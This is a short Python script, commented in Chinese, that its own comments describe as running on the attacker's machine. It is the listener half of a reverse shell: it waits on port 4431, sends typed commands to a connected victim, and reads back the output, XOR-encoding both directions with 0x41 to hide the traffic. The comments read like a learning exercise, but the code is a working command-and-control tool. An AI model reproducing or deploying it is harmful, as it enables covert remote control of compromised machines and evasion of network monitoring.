# 在attack上运行，作为一个服务器发送数据
import socket 

# 创建一个套接字。第一个参数表示使用IPV4，第二个参数表示创建一个TCP socket
# https://docs.python.org/3/library/socket.html#socket.AF_INET
# https://docs.python.org/3/library/socket.html#socket.SOCK_STREAM
# 用with真香，不用close了
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	# 将套接字绑定到 address。套接字必须尚未绑定。0.0.0.0是一个缺省的表述。
	# port应该在1-65535，并且小于1024的需要权限
	s.bind(("0.0.0.0", 4431))
	# 开启监听，1是连接的最大数量
	s.listen(1)
	print("Listening on port 4431... ")
	# accept blocks 并等待连接
	# accept返回值为一个connection，以及client的地址。我们通过这个connection和client通信。
	conn, client_addr = s.accept()
	with conn:
		print (" Received connection from : ", client_addr)
		while True:
			command = input('~$ ')
			encode = bytearray(command,encoding="utf-8")
			for i in range(len(encode)):
				encode[i] ^=0x41
			conn.sendall(encode)

			en_data=conn.recv(1024)
			decode = bytearray(en_data)
			for i in range(len(decode)):
				decode[i] ^=0x41
			print(decode.decode("utf-8"))